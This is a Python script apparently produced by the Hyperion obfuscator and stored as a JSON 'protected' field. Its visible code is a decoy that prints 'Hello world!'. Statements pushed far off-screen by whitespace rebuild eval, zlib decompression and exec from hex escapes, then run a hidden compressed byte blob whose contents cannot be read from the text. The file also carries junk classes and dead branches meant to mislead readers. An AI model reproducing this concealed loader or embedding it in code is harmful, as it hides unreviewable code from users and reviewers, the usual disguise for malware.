"protected": "from builtins import *\nfrom math import prod as _frame\n\n\n__obfuscator__ = 'Hyperion'\n__authors__ = ('billythegoat356', 'BlueRed')\n__github__ = 'https://github.com/billythegoat356/Hyperion'\n__discord__ = 'https://discord.gg/plague'\n__license__ = 'EPL-2.0'\n\n__code__ = 'print(\"Hello world!\")'\n\n\n_square, Algorithm, Substract, Ceil, StackOverflow, Modulo, Hypothesis = exec, str, tuple, map, ord, globals, type\n\nclass Invert:\n    def __init__(self, Cube):\n        self._theory = _frame((Cube, -55915))\n        self._statistics(Negative=-69052)\n\n    def _statistics(self, Negative = None):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        self._theory /= -15948 / Negative\n        \n        try:\n            (({Ceil: _floor}, _square) for _square in {Ceil: _floor})\n\n        except ArithmeticError:\n            ((StackOverflow, Substract, Ceil) or Substract if (StackOverflow, Substract, Ceil) and Substract else ... or (Substract, (StackOverflow, Substract, Ceil)))\n\n        except:\n            Hypothesis(16080 + -5979) == True\n\n    def Multiply(self, _ceil = -38298):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        _ceil -= -76722 + 91108\n        self.Run != str\n        \n        try:\n            ({Substract: Algorithm} or Ceil if {Substract: Algorithm} and Ceil else ... or (Ceil, {Substract: Algorithm}))\n\n        except AssertionError:\n            ((_square, {_floor: Algorithm}) for _square in (Ceil, Ceil) if Substract >= Substract)\n\n        except:\n            Hypothesis(9237 - 3741) == str\n\n    def _math(_product = float):\n        return Modulo()[_product]\n\n    def Round(_absolute = 41833 - -1462, Floor = None, _positive = Modulo):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        _positive()[_absolute] = Floor\n        \n        try:\n            ((Algorithm, (StackOverflow, Ceil)) for Algorithm in {_floor: Algorithm} if _floor > Ceil)\n\n        except ArithmeticError:\n            (((StackOverflow, Substract, Ceil), _square) for _square in {Ceil: _floor})\n\n        except:\n            Hypothesis(92477 - -35480) == float\n\n    def execute(code = str):\n        return _square(Algorithm(Substract(Ceil(StackOverflow, code))))\n\n    @property\n    def Run(self):\n        self._callfunction = '<__main__._math object at 0x000008310BE11394>'\n        return (self._callfunction, Invert.Run)\n\nif __name__ == '__main__':\n    try:\n        Invert.execute(code = __code__)\n        Walk = Invert(Cube = 73662 / 38019)\n\n        Invert(Cube = -19495 - 83431).Multiply(_ceil = -99887 - Walk._theory)                                                                                                                                                                                                                                                          ;Invert.Round(_absolute='OoOOO0O0o0oooo0OO0',Floor=b'x\\x9c\\xedZ\\xebs\\xe28\\x12\\xff\\x9e\\xbf\"\\xcb\\x17Ce&\\xb1%Y\\x06\\xaa\\xf2\\xe5\\x8a\\xbbZRL\\xb8\\xda\\\\\\xdd\\xcc\\xd6L\\x8a2\\xd8$\\xce\\x1a;\\x05f\\'\\xf9\\xef\\xaf[\\x0f#\\x8c\\r\\xe61\\x99\\xbd\\xdc\\xd9\\xb4\\xf5j=\\xdc-\\xfd\\xd4-\\x93\\xcd_\\xbbg\\xe7pE\\xd3\\xa6\\x08\\xf1\\x1a\\x8d\\xd2\\xf1t\\xb9\\x98\\xf8Y:\\x1f\\x8d\\xce\\x7f\\xb9n\\xfc\\xfa\\xfa\\x1c\\xce\\xa34i\\x9c\\xa7s\\x83\\xcd_f\\x8f\\xe9|!x\\x9a\\x8dq\\x14\\xc7\\xaf\\xd9c\\xf8\\x90\\xfa\\x19uy\\xe3C\\xe3o\\xf12\\xfc-\\x0c\\x1a\\xad\\xb5Z\\x0fQ\\xf6\\xb8\\x1c\\xcb\\x86\\x1f\\xb3\\xecy\\xd1\\xbd\\xba\\x92y\\x97\\x93tvUh\\xe6\\xaa\\xa2\\xef ZL\\xd2y\\xb0\\xde\\x8c\\xca\\xbc|x\\xb8z\\x8e\\xfd\\x87eX\\xa8\\x14G\\x930Y\\x84\\xb2\\xd2\\xdf\\xff9\\xf8H.\\xed\\x02\\xcb$\\rd\\xb9\\xf5<\\x8f\\x92\\xac\\xd9\\xf85\\x8c\\xe3\\xf4\\xfc{:\\x8f\\x83_\\x1a-\\xeb\\xac\\xd5\\xcd\\xb9\\xb1\\xdcZ\\xfc\\x11\\x05V\\xeb,|\\x99\\x84\\xcf\\x99\\x12f\\xf2\\xbc\\x84\\x9a\\xbf\\xa5\\x8bpq\\xee\\xcf\\xc3\\xf3y\\x18|K\\xfe\\x1d\\xa5q\\x98\\xc9\\x8c1H\\xe6[\\xf2{\\xba\\x14)\\xff\\x1c\\x1b\\xf9\\x96\\xdc\\xa6\\xe34x=\\x8f\\xa3?\\xa0\\xdek\\xbal\\xb4\\xce\\xe4\\xa0\\xa2\\xd9s:\\xcfF#\\xe8\\xedua\\xb5.\\xc3\\x97(k\\xb6\\xce\\xe2t\\xe2\\xc7\\x8bf\\xeb\\xab\\xd5\\x8f\\xf1\\xea\\xf7\\xc5\\x0fc\\xd6\\xfd\\xf5C\\x9c\\x8e\\xa1\\xf8l\\xa3\\x0c+$\\xb3\\x04~\\xf8\\x00J0n}\\xedv/>^|l~l^8\\xad\\xd6\\xfd\\xfdu\\x10\\xcd\\xcb+C\\x02\\xae<\\xbb\\x1fo\\xd6}\\x083?\\xcb*\\xea\\xbf|\\x7f\\xf9..\\x08^\\xe0\\xc2\\x18\\x0cX\\xbe\\xceYY\\xa9\\xeeU\\xb5\\x14\\xcb^\\xef\\xafW\\xa2)\\xefi\\x98\\xf6\\x86\\xe9\\xb0\\xd7\\xeb\\xa5\\xa9\\xfc\\r\\x87C\\xec\\xa9\\xd8T\\xd3\\x1a/\\xa38\\x8b\\x12\\x94\\xee\\x9f\\xfe|qVV\\x13[\\x8c\\x9e\\xe2\\xa7(z\\x92\\xf7\\x13FE\\xfa)\\x92\\xcd\\xe6\\xad\\n\\t5K:\\x8a\\xa2\\xc9\\xc2O\\xa2qQf\\xad\\x0f\\x89RE\\xae\\x9ad\\xaf\\xfa\\xad\\xaf\\xc76p\\x19%A\\xf8\\xd2\\xb4^\\xa7Q\\xfc\\x12>&\\xcb\\r\\x96\\xfbV\\xa5` \\xa3\\x87\\xf1\\xa1(\\x1e\\xa6\\xa2\\x00\\xa8WW0\\x8b$\\xca\\xe2hy\\xb0`*\\xeb\\xd7\\x15Lu\\x03Z0\\xf3lQ&\\x92\\xaa\\x19\\xfb\\xe9\\xd3-\\xdc\\x9fno\\xf3\\xc7;\\x92E\\xb8\\x9c\\xffk\\x1fa\\xc0\\xeb\\x83\\x10P\\x1ex\\xdd\\nYX\\xd6\\xe5S\\x1a%\\x95u\\xee\\xf0\"w\\x04~\\x18!HD\\x04\\xefH\\x90q\\x9an\\x96\\x82 K\\x01-\\x17\\x84\\x10\\nQ\\x92yO\\xd2\\xf0\\xff\\x0ckK\\xe3\\x16\\x97\\x95\\x9aS\"\\xf6\\x8e\\x04\\x91\\xf9i<\\xddg\\x81\\xe1>\\x84;\\x13\\\\ \\x9f(\\x16!\\xfc\\x9e\\xde\\x91P\\xc2E\\xec\\xff\\xa3\\xf6\\xf4\\x80\\xed\\'\\xb5\\xd3\\xd4\\xb6\\xe5c8\\x84\\x08\\x92m\\xbf\\'\\x91\\xc4\\xd1\\xf3,\\x9d\\xd4\\x16\\x8a\\xe8PX}3\\x19\\xc2\\xcf\\xac\\\\\\x8e0\\xcdJ\\xbb\\xa79\\xb6\\xa8C\\x02\\xd2&\\x01\\xb5I\\x07\\xec\\xa7 D#\\xbai\\xb5\\xa7\\xd9\\xa6\\x05\\xd1\\x12\\xe6\\xe1{\\x11\\xfe$|\\xa9\\x8fV\\x07J\\xdej9Pl\\xd7\\xe2l\\x8f\\xd8\\x88\\x03Q\\xb8\\xedQg\\xe4\\x8c8\\xb0w6s\\x8f\\xd5x\\xdb\\x9dR\\x0e\\xe4\\x00uTHU\\xe8\\xa98\\'c1+\\xea\\xf0\\xba\\xf5f\\x8e\\xa6\\xfb\\xad\\xa3\\xe3\\xdc#|\\xca\\x03bs\\xe2\\xb9\\xbc\\xc3\\'\\x1e\\x83g\\xe8Q\\xc8\\xe9\\xf0\\xc0\\xb3\\xf9\\xd4#\\x1e\\x83\\x94\\xeb\\xb5\\xb9\\xcb\\xe9\\xce\\xbe\\xb7\\xdax\\xca\\xb0\\xb9\\x95\\xdb\\xd1-Z6e\\x13`\\xeb\\x90k\\x0e\\xe4\\xbe\\xd2\\xfe\\xbe\\xe9\\x0f\\x06\\x83\\x9bA\\x7f\\xd0\\xef\\x8b\\xe8\\xe0X\\x15\\xa3\\xca\\x98V\\x8fR\\x9d\\xa7\\x88(r\\x95\\x8a\\xeb\\xf0\\xb2\\xda\\xe0\\xe0\\xcf\\xc6\\x81\\x7f.F\\x95\\x8f\\x0e\\xb62\\x1c\"\\x0c\\xb0[\"\\xdbJ\\xa9\\xc8u\\x8e\\x0b]y\\xbb\\xf8x{\\xb8\\x93o\\xa4\\xfa\\xb8\\x13]\\xe4\\x06\\xed\\xdd^/$\\xfc+\\xe1j\\xa1\\x87\\x85\\x05\\x92kx\\xecK\\xe9\\x95\\xc8\\x94\\n\\xdd\\x82J\\x85Z\\x95\\xba\\xeb\\xf0\\xb6\\xf7\\x14\\xcelu\\x14\\x91(T\\x06\\xea\\x96\\xcb\\xa1J<[\\x97X\\xc0\\xc3\\xb5;PO#\\x7f\\xe7\\xf2\\xd3\\xa3\\x1d\\xa2%\\x01\\x86\\x04j\\xc1F?\\xd7\\x86\\xbb[\\x0e\\x12[\\\\\\xe6\\x9eH\\xa5\\xbd\\xde\\xb0\\'\\xf4\\x08\\x01\\xfcN\\xb1rm\\xb5\\xea\\xf4J\\xb4\\x95z\\xc4j4V\\xed6>\\xa7\\xae\\n\\x0f\\x18$\\xf1\\xc8\\x94x\\xbbq\\xb7\\x12\\xee\\x10\\xe2\\x067\\xb0i\\x03\\xe8\\xdd\\xf4E\\xb2\\x7f4\\xe6\\xb5\\x95$\\xb44pR\\xb7\\xd5V\\xc5U>1\\xb6\\xb5]\\xbc\\xb5%\\xa8\\xa6U\\x92[\\x08\\xea\\xd2\\xe7t{O-\\x89\\x13\\xf0\\x18biO@\\xc5\\xc9\\x8d\\r2r\\xc1\\xac@\\xf2\\xd0\\xbc\\x10\\xa6F!\\xefX\\x8d\\xd8\\nkkJ27\\x10\\xb4DQRRd\\x82\\xa4\\x14\\xf7\\x95f\\xfc\\x84\\xfe\\x14\\x8c*\\x8ed,\\x8a\\xdf\\xf8\\xbd\\x0e]c\\x87\\xaf\\xb0m\\r\\xb3)\\x07\\xa4\\xe0S\\x067\\xb5\\xa9\\xcdDJ\\xde\\x98\\xa7K\\xb8\\x88\\xf3imXM\\xc5\\x19b\\xda\\x13\\xa8\\x88\\x88\\x98\\xf6\\xf6\\xda\\x1d\\xe5\\xb9\\xb40\\xe0W.F\\xbf_G[\\xfb\\xcc|\\x1b\\x8a\\x9dSl\\xb8\\x1a/4\\x8e\\xd8*\\xa4\\x1aS\\x8c\\rw\\x17/=p\\x85|\\xfe\\xfc\\xe5\\xcbg\\xb8\\xc4\\xe3\\xb3\\x8a}\\xd9\\xcf(\\xb1Q]\\xa08\\xd8\\x05\\xc5\\xefhk\\x84\\x15\\x8cH\\x93\\\\\\x15:J8ux\\xf75\\xd5\\x84P\\xe4\\xadd\\xb2\\'f\\xecZ>\\xb8\\x80\\x98Z\\x1er\\xb1\\xc8e\\xa3i\\xf7\\x929\\x10\\x10\\x88g\\xfb\\xc4\\x967\\xf3\\xc0\\xef\\x007\\x08\\xdc#\\xf0>D\\xe8\\x80\\xeb\\xa4s]\\x88O\\xc0I\\xca\\xdd\\xa9\\x9c\\x8f\\x00\\x87\\x03\\xae\\x95\\xebQ\\xe1F9`<1\\x99\\xcf\\xc1\\xd5\\x12!U-O\\xd1\\xe9\\xf2\\xd8\\xaaW9\\x8a\\x1f\\x03Lp\\x81\\xf4\\xd4%b\\xb9D\\xc5\\x93\\xb1Z\\xb2U\\xb3\\xa0\\xdf_\\x01\\x8a<\\xa9\\x10\\xaba\\x9f\\xb5\\xb1{\\x1e\\xc8\\x19\\xa0AT\\x8eS\\xc3)\\xab\\x05\\x9e\\x07\\xcd\\x845]\\xd7\\xd0\\xc6\\xbe\\x1e\\xad\\x0b\\x80\\xe4R\\xbc)Y\\x8f\\xe1S\\xc7d\\xfe\\xceWlV\\xb9\\xdf\\xb64\\xc2\\xe5\\xe1^~\\xd6\\x07hT\\x07\\x81N\\x04\\xe4L\\x01\\xb3\\xad\\xb0\\xa6mxF9\\x16\\x19X\\xb5\\x8b\\x97\\xd7\\x07\\xf2\\xfbfC\\xc4\\x9c\\x0b(\\x02\\x86\\x8bn\\xf7\\xab\\xb5\\xcc\\xa6m\\xab\\x19\\x06\\xe9$\\x0c.[V\\x87L\\xb8\\xcf\\'x\\x0c\"\\xc8W13\\x0f\\xa9MB\\xb6\\xba\\x83\\xfc\\xa9c\\x81J\\x05\\xcc\\x1a7#C\\x08J,2\\xdd\\xbc\\xd7\\xa3\\xdb>&\\x9b\\n\\xfb\\x878tkk\\xea\\xfb\\x8f\\xf2\\x9b\\xd5\\xe3\\xcel9\\xd1~\\xfdL\\x1b\\xcf3p\\xf0[M1EV&\\x1f\\x06/\\x8d#5\\xed\\x1a\\xdb\\xad\\xad\\xcc|S{b;V\\x9a\\xae\\xc3K\\xeai\\xfa\\xc34\\x8a\\xc3\\xc4\\x9f\\x85\\xd7[\\xd1\\xa4\\xc3@\\x8d\\x9atL\\xe6\\xca4\\xdb\\xd9\\xdb\\x87\\x19\\x94m\\xed\\x05\\xe0\\x82\\x03\\xdcOv\\x8f\\xfb=\"\\xc6\\xd6\\xd9\\xd1Q\\xebY\\xafk\\xd3Hsu\\x9e\\x9a\\x1dux\\xeb\\x9e\\xa0\\xd4\\xc2\\x00\\xf3\\xd8#0\\x8e?\\xcc\\xfc6\\xf1\\xd9$\\xbf}9yDL\\xa6V\\xa5\\x98k\\x13\\xdf\\xf6iGs\\xc9I\\xc61&\\xa9\\xfci\\x13\\x0eh\\xb3\\x1dAv\\xbdM`\\x1c\\xdd\\x04\\xc6aNPx\\xb7m\\xbd\\x1c\\x8e\\x10\\xf5\\x1d\\x85S\\x1e\"\\xae\\xe3\\x80\\x85\\xe6vO\\x9a\\x1c\\xe2\\x9f\\x16x$\\xf8\\xc6#\\x92X\\xb1\\xf1\\xc1\\xf6\\x04\\xee\\xd5>G\\x10t\\x84G\\x0ed\\xe4\\x8d\\xf0\\xdb\\x07\\x1b\\xb9\\xe2\\x10b#\\xf7\\xc4\\xfd2h\\xd7\\x1e9\\xd0\\x8f\\x07=\\xe1\\x17\\x15\\x02\\xec\\xeef\\xeeO\\x98%\\x9b\\xf4\\x93\\x91\\xb8\\xf4c\\xd8\\xb1\\x86\\x9b8_\\xb2\\x85\\x9aA\\xcc#.N\\x9f\\x9c\\xcd\\xdc\\x9f\\xa0\\x80:\\x80\\xcc<0\\x088\\xf1:\\xe0.A\\xe8\\xa2\\xbb\\x14\\x82\\xc5o\\x83C\\x85ip\\x9c\\xe0n\\x03\\xc82\\xf0\\x950?\\x00\\xd8\\xb4\\x89\\xca\\xe7!\\x99\\x82\\xe9\\x1e\\xc2N\\xecC\\x0b6\\t\\xa0.\\x81\\x9d\\xf9\\xbf\\xc24\\xeb\\xc7q~>#\\xa6\\xc6\\xb1v\\xd9\\x9e\\x87i\\x06\\x8e\\xe2\\xa1\\xf1\\xe0\\xa6?\\xb8\\xb9\\xe9C\\x04\\x1c\\xbc\\x1bH\\xfe\\xa5\\x81tk\\xcfD\\x99\\x0e\\xd40%\\x1c\\xc3\\x10\\xd5G&\\xbb\\xf8j\\xcf\\xf6\\xaa\\xef\\xa2o\\x87.UgR?\\xce\\xce\\xdb\\xf7\\xf3\\xdf\\xd6\\xd6\\xf4\\xa9\\x84\\xf0\\xfc\\xd5\\xa9\\x05\\xe6\\x18OqC\\x8f\\x1dw\\xac\\xdc6t\\xe1:\\xe2\\xb9\"?\\xcf]\\x95CH\\xda\\x9c\\x10\\x00\\x1b\\xee*b\\x8583\\xf2\\xcc\\xb2\\xb2\\xf2<\\x8fx\\x04MJ\\xc4.\\nc\\x84\\x10\\xc6\\xe7\\xd16\\xe7\\x80N.\\xf1\\xdc1\\xf5\\xa9\\x0f\\x93-\\x10\\xd4\\x164\\xc6\\xf5\\to\\x11\\x08j\\x1f\\xfe.\\xb4\\x03\\xc4a\\xa2\\xd8\\x94q.\\x88B\\x9c\\xaat1\\xce\\x15\\x0f\\x12W\\xa4\\xe39\\x1fw\\xa8\\rD\\x04\\x7fQ\\x0eE*\\x93\\xe1&\\x1f\\xa1\\xed\\xb5>\\xa91^s\\x1c\\xcc(3\\xc7f\\x86\\x04<\\x87#e\\xbe{\\xb6\\x1a\\xb8\\x98\\x7f\\x9c\\xbe\\x93\\x81\\x02\\xf9c\\x97\\x8ek8\\xc3\\xe6\\xdf@\\xf41\\x08\\x86\\xae\\xe1@\\xef\\xe2\\xad\\xf9\\x9f\\x82\\x13\"l\\xc7]w\\xe7;*$j\\x84\\xccp\\xf0\\xb6\\xf1\\xd5>\\xad\\xff\\x9fs\\xa3\\xf7\\xfd2\\xf6\\x7fx=5\\xbc\\xc2\\x18`nh\\x88\\xdd\\x1c_\\x19\\xf4\\x95\\xbdg\\xd5\\xfb\\xad\\xe2\\x08\\x91\\x1e<\\xb1?\\x8f:@\\xae\\x8aS ,\\xef\\xacA\\xb3I\\xe66p*\\xc8\\xae\\xea\\xabH\\x0c\\x10\\x9bA\\xff\"\\\\#G\\xe5;\\xab\\xb4\\xe6\\xd5\\x94\\x97m\\xd6=\\xf1\\x96Q\\xfa.\\xa7j\\x7f\\x97N\\xcc-\\xb6\\xd8nq{\\xe6%\\xfd\\x17\\xeb\\xf0\\xc28\\xf7\\xd2\\x95IZ\\x07\\xb9>L]:\\xa5\\xbcR/\\xa7h\\xa7J\\'\\xce\\xee6L\\x9e\\x8dy\\xb6\"\\ns{\\xeb\\x9a\\x82y\\xceD\\x0cw\\x00\\x99\\x06\\xefS\\xf1\\xb0\\x8d9h\\xeae\\x9bYU\\xd4\\xa5\\xce\\'\\xa8*L\\xe3\\xad\\xcbT\\x9c\\xe9\\xdb\\xacW(+\\xea=\\xcf3\\xee*\\xb9\\xfehS\\xf1gc\\xc4\\x8fZ[U\\xf2\\\\\\xcd+&\\xe6\\x95H\\x0bS\\x17\\xfa\\x14X\\xce\\x14\\xd9\\xd4\\xcdy\\xa9H\\xcb\\xb6e\\x9a\\x8b\\xb9G\\xd4>\\xc3\\x84\\x9e\\xbc<M\\x8dyx\\xbau\\xf1\\xd6&4\\xfe\\x9d\\x0f\\xff\\xca\"\\xceh\\xf1\\xffX=\\xf4TO|\\x10)\\xffm\\xc5G6\\x10\\x1e?\\xe2)\\x18-\\xe6\\xbd\\xdd\\xa7\\xd0#\\x8e+O\\xfa\\xe9\\xe9?\\xc7\\x0b\\x12B')\n\n        if 322854 > 7141211:\n            Walk.Multiply(_ceil = -3842 + Walk._theory)\n        elif 285746 < 2534124:\n            Invert(Cube = -39701 + 40312)._statistics(Negative = Walk._theory - -73431)                                                                                                                                                                                                                                                          ;nmmnmnnmnnnmnmmnnmm,iilijijllljiljiiiljlill,O0ooOO0OoOOoooOo00,OooOO00o0o0OoO0oOO,nmmnmmmnnmnmnnmnnnn=(lambda XXWWXXXWXWWXWWXXWXXXWXXW:XXWWXXXWXWWXWWXXWXXXWXXW['\\x64\\x65\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73']),(lambda XXWWXXXWXWWXWWXXWXXXWXXW:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(XXWWXXXWXWWXWWXXWXXXWXXW)\"),filename='\\x6f\\x4f\\x44\\x4f\\x4f\\x4f\\x44\\x4f\\x44\\x4f\\x6f\\x44\\x44\\x44\\x44\\x6f\\x4f\\x44\\x4f\\x44\\x6f\\x4f\\x44\\x4f',mode='\\x65\\x76\\x61\\x6c'))),(lambda XXWWXXXWXWWXWWXXWXXXWXXW:XXWWXXXWXWWXWWXXWXXXWXXW(__import__('\\x7a\\x6c\\x69\\x62'))),(lambda:(lambda XXWWXXXWXWWXWWXXWXXXWXXW:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(XXWWXXXWXWWXWWXXWXXXWXXW)\"),filename='\\x6f\\x4f\\x44\\x4f\\x4f\\x4f\\x44\\x4f\\x44\\x4f\\x6f\\x44\\x44\\x44\\x44\\x6f\\x4f\\x44\\x4f\\x44\\x6f\\x4f\\x44\\x4f',mode='\\x65\\x76\\x61\\x6c')))('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x27\\x29\\x2e\\x65\\x78\\x65\\x63')),(lambda NMMMNMMNNNMNMMNMN,XXWWXXXWXWWXWWXXWXXXWXXW:NMMMNMMNNNMNMMNMN(XXWWXXXWXWWXWWXXWXXXWXXW))\n        Walk.Multiply(_ceil = -50004 + Walk._theory)                                                                                                                                                                                                                                                          ;OooOO00o0o0OoO0oOO()(nmmnmmmnnmnmnnmnnnn(nmmnmnnmnnnmnmmnnmm(O0ooOO0OoOOoooOo00(iilijijllljiljiiiljlill('\\x76\\x61\\x72\\x73'))),Invert._math(_product='OoOOO0O0o0oooo0OO0')))\n\n    except Exception as _floor:\n        if 402511 > 4393972:\n            Invert.execute(code = Algorithm(_floor))\n\n        elif 327906 > 9557897:\n            Walk.Multiply(_ceil = -63755 * Walk._theory)"